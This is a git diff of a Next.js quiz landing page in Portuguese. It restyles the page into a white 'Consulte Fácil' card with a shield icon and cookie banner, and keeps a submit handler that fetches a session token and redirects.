@@ -5,66 +5,103 @@ export default function Quiz() {
   const [loading, setLoading] = useState(false);
   const [modalOpen, setModalOpen] = useState(false);
   const [step, setStep] = useState(1);
+  const [cookiesOpen, setCookiesOpen] = useState(true);
 
+  const handleSubmit = async () => {
+    setLoading(true);
 
+    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
 
-const handleSubmit = async () => {
-  setLoading(true);
+    const goDefault = async () => {
+      await wait(300);
+      window.location.href = "/inicio";
+    };
 
-  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+    try {
+      const res = await fetch("/api/session-token", { method: "POST" });
+      const data = await res.json().catch(() => null);
 
-  const goDefault = async () => {
-    await wait(300); 
-    window.location.href = "/inicio";
+      if (res.ok && data?.token) {
+        window.location.href = `/api/go?token=${encodeURIComponent(
+          data.token
+        )}`;
+      } else {
+        await goDefault();
+      }
+    } catch {
+      await goDefault();
+    } finally {
+      setLoading(false);
+    }
   };
 
-  try {
-    const res = await fetch("/api/session-token", { method: "POST" });
-    const data = await res.json().catch(() => null);
-
-    if (res.ok && data?.token) {
-     
-      window.location.href = `/api/go?token=${encodeURIComponent(data.token)}`;
-    } else {
-      await goDefault();
-    }
-  } catch {
-    await goDefault();
-  } finally {
-    setLoading(false);
-  }
-};
-
   return (
-  
     <div className="page">
-      <main className="center">
-	   <title>Consulta no Seu Nome</title>
-        <h1 className="title">Portal de Atendimento</h1>
-        <p className="subtitle">Acesse com segurança e agilidade</p>
+      <main className="wrapper">
+        <section className="card">
+          <h1 className="title">Consulte Fácil</h1>
 
-        <button
-          className="cta"
-          onClick={() => setModalOpen(true)}
-          aria-haspopup="dialog"
-          aria-controls="modal-root"
-        >
-          Consultar agora
-        </button>
+          <div className="iconWrap" aria-hidden="true">
+            <div className="iconCircle">
+              <svg
+                width="48"
+                height="48"
+                viewBox="0 0 24 24"
+                role="img"
+                aria-label="Protegido"
+              >
+                <path
+                  d="M12 3l7 3v6c0 4.418-3.582 8-7 8s-7-3.582-7-8V6l7-3z"
+                  fill="#eaf2ff"
+                />
+                <path
+                  d="M10.6 13.4l-2.1-2.1 1.1-1.1 1 1 3.9-3.9 1.1 1.1-5 5z"
+                  fill="#2a66ff"
+                />
+                <path
+                  d="M12 3l7 3v6c0 4.418-3.582 8-7 8V3z"
+                  fill="rgba(42,102,255,.08)"
+                />
+              </svg>
+            </div>
+          </div>
+
+          <p className="subtitle">
+            Você pode estar apto à negociação. Clique abaixo para consultar
+          </p>
+
+          <button
+            className="cta"
+            onClick={() => setModalOpen(true)}
+            aria-haspopup="dialog"
+            aria-controls="modal-root"
+          >
+            CONSULTAR AGORA
+          </button>
+
+          <nav className="links" aria-label="links-legais">
+            <a href="/politica-de-privacidade">Política de Privacidade</a>
+            <span className="sep">|</span>
+            <a href="/termos-de-uso">Termos de Uso</a>
+          </nav>
+        </section>
       </main>
 
-      <footer className="footer">
-        <nav className="links">
-          <a href="/politica-de-privacidade">Política de Privacidade</a>
-          <span className="dot">•</span>
-          <a href="/termos-de-uso">Termos de Uso</a>
-          <span className="dot">•</span>
-          <a href="/servicos">Serviços</a>
-        </nav>
-        <p className="copy">Todos direitos reservados 2025</p>
-      </footer>
+      {/* Cookie banner (visual como no print) */}
+      {cookiesOpen && (
+        <div className="cookieBar" role="region" aria-label="cookies">
+          <span>Usamos cookies para melhorar sua experiência.</span>
+          <button
+            type="button"
+            className="cookieBtn"
+            onClick={() => setCookiesOpen(false)}
+          >
+            Aceitar
+          </button>
+        </div>
+      )}
 
-      {/* Modal */}
+      {/* Modal (lógica inalterada) */}
       {modalOpen && (
         <div
           id="modal-root"
@@ -135,168 +172,243 @@ const handleSubmit = async () => {
         </div>
       )}
 
-      {/* GLOBAL RESET to eliminate any white borders/gutters */}
+      {/* GLOBAL RESET — evita flashes brancos nas bordas */}
       <style jsx global>{`
-        html, body, #__next { height: 100%; }
-        * { box-sizing: border-box; }
-        body { margin: 0; background: #000; } /* avoids OS-level white flash */
-        button, input { outline: none; }
+        html,
+        body,
+        #__next {
+          height: 100%;
+        }
+        * {
+          box-sizing: border-box;
+        }
+        body {
+          margin: 0;
+          background: #f2f6fb;
+          color: #0f172a;
+          font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial,
+            sans-serif;
+        }
+        button,
+        input {
+          outline: none;
+        }
       `}</style>
 
       <style jsx>{`
-        /* Fundo gradiente dinâmico (cores do Brasil) */
         .page {
           min-height: 100dvh;
-          display: flex;
-          flex-direction: column;
-          justify-content: space-between;
-          background: linear-gradient(135deg, #009739, #ffd700, #002776);
-          background-size: 300% 300%;
-          animation: shift 14s ease-in-out infinite;
-          color: #ffffff;
-          font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-        }
-        @keyframes shift {
-          0% { background-position: 0% 50%; }
-          50% { background-position: 100% 50%; }
-          100% { background-position: 0% 50%; }
-        }
-
-        .center {
           display: grid;
           place-items: center;
+          padding: 32px 16px 96px;
+          background: #eef3f9;
+        }
+
+        .wrapper {
+          width: 100%;
+          display: grid;
+          place-items: center;
+        }
+
+        .card {
+          width: min(720px, 92vw);
+          background: #ffffff;
+          border-radius: 14px;
+          padding: 36px 28px 28px;
+          box-shadow: 0 10px 30px rgba(13, 30, 66, 0.08),
+            0 2px 8px rgba(13, 30, 66, 0.06);
           text-align: center;
-          padding: 64px 20px;
         }
 
         .title {
-          margin: 12vh 0 8px;
-          font-size: clamp(28px, 5vw, 44px);
+          margin: 0 0 8px;
+          font-size: clamp(22px, 3.6vw, 28px);
           font-weight: 800;
-          letter-spacing: 0.4px;
-          text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-          animation: fadeUp 700ms ease both;
+          color: #0f1e42;
+          letter-spacing: 0.2px;
         }
+
+        .iconWrap {
+          display: grid;
+          place-items: center;
+          margin: 18px 0 10px;
+        }
+        .iconCircle {
+          width: 108px;
+          height: 108px;
+          border-radius: 999px;
+          display: grid;
+          place-items: center;
+          background: radial-gradient(
+            circle at 30% 30%,
+            #f2f7ff,
+            #dfeaff 60%,
+            #cfe0ff
+          );
+          box-shadow: inset 0 2px 10px rgba(32, 71, 214, 0.08),
+            0 10px 20px rgba(32, 71, 214, 0.08);
+        }
+
         .subtitle {
-          margin: 0 0 28px;
-          opacity: 0.9;
-          font-size: clamp(14px, 2.2vw, 18px);
-          animation: fadeUp 900ms ease both;
-        }
-        @keyframes fadeUp {
-          from { opacity: 0; transform: translateY(8px); }
-          to { opacity: 1; transform: translateY(0); }
+          margin: 8px auto 18px;
+          max-width: 560px;
+          color: #3b4861;
+          font-size: 15.5px;
         }
 
         .cta {
           appearance: none;
           border: none;
           cursor: pointer;
-          padding: 14px 28px;
-          border-radius: 12px;
-          background: rgba(255, 255, 255, 0.96);
-          color: #0b4d2c;
-          font-weight: 700;
-          font-size: 16px;
-          transition: transform 120ms ease, box-shadow 200ms ease, filter 200ms;
-          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
-          animation: pulse 2.2s ease-in-out infinite;
-          will-change: transform;
+          padding: 12px 22px;
+          border-radius: 10px;
+          background: #2a66ff;
+          color: #ffffff;
+          font-weight: 800;
+          letter-spacing: 0.4px;
+          font-size: 14.5px;
+          transition: transform 120ms ease, box-shadow 200ms ease,
+            filter 200ms ease;
+          box-shadow: 0 10px 24px rgba(42, 102, 255, 0.28);
         }
-        .cta:hover { transform: translateY(-1px); }
-        .cta:active { transform: translateY(0); }
-        @keyframes pulse {
-          0%, 100% { transform: translateY(0) scale(1); }
-          50% { transform: translateY(-1px) scale(1.01); }
+        .cta:hover {
+          transform: translateY(-1px);
+          filter: brightness(1.03);
+        }
+        .cta:active {
+          transform: translateY(0);
+          filter: brightness(0.98);
         }
 
-        .footer {
-          text-align: center;
-          padding: 24px 16px 28px;
-          line-height: 1.5;
-          backdrop-filter: saturate(120%) brightness(1.05);
+        .links {
+          margin-top: 18px;
+          font-size: 14px;
         }
         .links a {
-          color: #ffffff;
+          color: #2a66ff;
           text-decoration: none;
           font-weight: 600;
-          position: relative;
         }
-        .links a::after {
-          content: "";
-          position: absolute;
-          left: 0; bottom: -2px;
-          width: 0%;
-          height: 2px;
-          background: currentColor;
-          transition: width 220ms ease;
+        .links a:hover {
+          text-decoration: underline;
         }
-        .links a:hover::after { width: 100%; }
-        .dot { margin: 0 10px; opacity: 0.85; }
-        .copy { margin: 6px 0 0; opacity: 0.9; }
+        .sep {
+          margin: 0 8px;
+          color: #9aa7bd;
+        }
 
-        /* Modal */
+        /* Cookie bar */
+        .cookieBar {
+          position: fixed;
+          left: 50%;
+          transform: translateX(-50%);
+          bottom: 18px;
+          width: min(860px, 92vw);
+          background: #ffffff;
+          color: #2b3851;
+          border-radius: 10px;
+          padding: 14px 16px;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          gap: 12px;
+          box-shadow: 0 10px 26px rgba(14, 28, 54, 0.12),
+            0 2px 8px rgba(14, 28, 54, 0.08);
+        }
+        .cookieBtn {
+          appearance: none;
+          border: none;
+          cursor: pointer;
+          padding: 10px 18px;
+          border-radius: 8px;
+          background: #2a66ff;
+          color: #fff;
+          font-weight: 800;
+        }
+
+        /* Modal (mantido) */
         .backdrop {
           position: fixed;
           inset: 0;
           display: grid;
           place-items: center;
-          background: rgba(0, 0, 0, 0.45);
+          background: rgba(10, 24, 56, 0.45);
           backdrop-filter: blur(2px);
           z-index: 50;
         }
         .modal {
           width: min(92vw, 520px);
-          background: rgba(6, 28, 49, 0.22); /* translúcido */
-          border-radius: 16px;
+          background: #ffffff;
+          border-radius: 14px;
           padding: 22px;
-          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
-          /* sem borda branca */
-          border: none;
+          color: #0f172a;
+          box-shadow: 0 18px 60px rgba(10, 24, 56, 0.25);
+          border: 1px solid rgba(15, 23, 42, 0.06);
+          text-align: center;
         }
-        .popIn { animation: popIn 200ms ease-out both; }
+        .popIn {
+          animation: popIn 200ms ease-out both;
+        }
         @keyframes popIn {
-          from { opacity: 0; transform: scale(0.96); }
-          to { opacity: 1; transform: scale(1); }
+          from {
+            opacity: 0;
+            transform: scale(0.96);
+          }
+          to {
+            opacity: 1;
+            transform: scale(1);
+          }
         }
 
         .modalTitle {
           margin: 4px 0 8px;
           font-size: clamp(20px, 4vw, 26px);
           font-weight: 800;
+          color: #0f1e42;
         }
-        .modalText { margin: 0 0 18px; opacity: 0.95; }
+        .modalText {
+          margin: 0 0 18px;
+          color: #42506a;
+        }
         .sectionOver {
           margin: 2px 0 6px;
-          font-size: 13px;
+          font-size: 12px;
           letter-spacing: 0.6px;
           text-transform: uppercase;
-          opacity: 0.9;
+          color: #6b7893;
         }
         .question {
           margin: 0 0 12px;
-          font-size: 22px;
+          font-size: 20px;
           font-weight: 800;
+          color: #0f1e42;
         }
         .input {
           width: 100%;
           padding: 12px 14px;
           border-radius: 10px;
-          border: none;
+          border: 1px solid rgba(15, 23, 42, 0.12);
           outline: none;
           margin: 4px 0 16px;
           text-align: center;
           font-size: 16px;
-          background: rgba(255, 255, 255, 0.95);
-          color: #043a21;
-          transition: box-shadow 160ms ease, transform 120ms ease;
+          background: #ffffff;
+          color: #0f172a;
+          transition: box-shadow 160ms ease, transform 120ms ease,
+            border-color 160ms ease;
         }
         .input:focus {
-          box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.55);
+          box-shadow: 0 0 0 3px rgba(42, 102, 255, 0.18);
+          border-color: rgba(42, 102, 255, 0.55);
           transform: translateY(-1px);
         }
 
-        .row { display: flex; gap: 10px; flex-wrap: wrap; }
+        .row {
+          display: flex;
+          gap: 10px;
+          flex-wrap: wrap;
+          justify-content: center;
+        }
 
         .primary {
           flex: 1;
@@ -306,38 +418,42 @@ const handleSubmit = async () => {
           cursor: pointer;
           padding: 12px 18px;
           border-radius: 10px;
-          background: #ffd700;
-          color: #063d2b;
+          background: #2a66ff;
+          color: #ffffff;
           font-weight: 800;
-          transition: transform 120ms ease, box-shadow 250ms ease, filter 200ms;
-          box-shadow: 0 10px 26px rgba(0, 0, 0, 0.25);
-          will-change: transform;
+          transition: transform 120ms ease, box-shadow 250ms ease,
+            filter 200ms ease;
+          box-shadow: 0 10px 26px rgba(42, 102, 255, 0.28);
         }
-        .primary:disabled { opacity: 0.7; cursor: not-allowed; }
-        .primary:hover:not(:disabled) { transform: translateY(-1px); }
-        .primary:active:not(:disabled) { transform: translateY(0); }
+        .primary:disabled {
+          opacity: 0.7;
+          cursor: not-allowed;
+        }
+        .primary:hover:not(:disabled) {
+          transform: translateY(-1px);
+        }
+        .primary:active:not(:disabled) {
+          transform: translateY(0);
+        }
 
         .ghost {
           flex: 0 1 auto;
           min-width: 120px;
           appearance: none;
-          border: 1px solid rgba(255, 255, 255, 0.35);
+          border: 1px solid rgba(15, 23, 42, 0.18);
           background: transparent;
-          color: #ffffff;
+          color: #0f172a;
           cursor: pointer;
           padding: 12px 18px;
           border-radius: 10px;
           transition: background 0.2s ease, transform 0.12s ease;
         }
-        .ghost:hover { background: rgba(255, 255, 255, 0.08); transform: translateY(-1px); }
-        .ghost:active { transform: translateY(0); }
-
-        /* micro-tilt on hover */
-        .microTilt { transform-style: preserve-3d; }
-        .microTilt:hover { transform: translateY(-1px) rotateX(1deg) rotateY(-1deg); }
-
-        @media (max-width: 420px) {
-          .modal { padding: 18px; }
+        .ghost:hover {
+          background: rgba(15, 23, 42, 0.04);
+          transform: translateY(-1px);
+        }
+        .ghost:active {
+          transform: translateY(0);
         }
       `}</style>
     </div>
